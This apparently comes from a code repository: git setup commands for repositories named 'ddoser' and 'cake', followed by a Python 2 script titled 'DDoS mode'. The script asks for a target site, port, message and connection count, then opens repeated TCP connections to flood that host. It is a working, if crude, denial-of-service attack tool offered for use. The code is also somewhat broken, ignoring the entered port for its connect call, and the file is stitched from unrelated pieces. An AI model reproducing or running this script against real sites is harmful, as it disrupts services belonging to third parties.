git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/Punche991/ddoser.git
git push -u origin master
echo "# cake" >> README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/Punche991/cake.git
git push -u origin master
import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
print ("DDoS mode loaded")
host=raw_input( "Site you want to DDoS:" )
port=input( "Port you want to attack:" )
message=raw_input( "Input the message you want to send:" )
conn=input( "How many connections you want to make:" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[DDoS Attack Engaged]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = raw_input("Do you want to ddos more?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"\Deq\main.py")